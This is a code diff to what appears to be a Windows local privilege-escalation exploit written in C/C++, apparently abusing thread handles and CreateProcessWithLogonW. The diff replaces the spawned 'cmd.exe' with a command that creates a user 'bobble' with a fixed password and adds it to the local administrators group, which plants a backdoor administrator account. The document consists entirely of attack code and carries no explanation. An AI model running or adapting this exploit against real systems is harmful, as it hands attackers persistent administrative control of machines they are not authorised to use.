@@ -5,7 +5,7 @@
 
 #define MAX_PROCESSES 1000
 
-#define COMMAND L"cmd.exe"
+#define COMMAND_LINE L"cmd.exe /c net user bobble Password1 /add && net localgroup administrators bobble /add"
 
 HANDLE GetThreadHandle()
 {
@@ -151,7 +151,7 @@ int main()
 
 			if (CreateProcessWithLogonW(L"test", L"test", L"test",
 				LOGON_NETCREDENTIALS_ONLY, nullptr,
-				L"cmd.exe", CREATE_SUSPENDED, nullptr, nullptr,
+				COMMAND_LINE, CREATE_SUSPENDED, nullptr, nullptr,
 				&startInfo, &procInfo))
 			{
 				HANDLE hProcessToken;
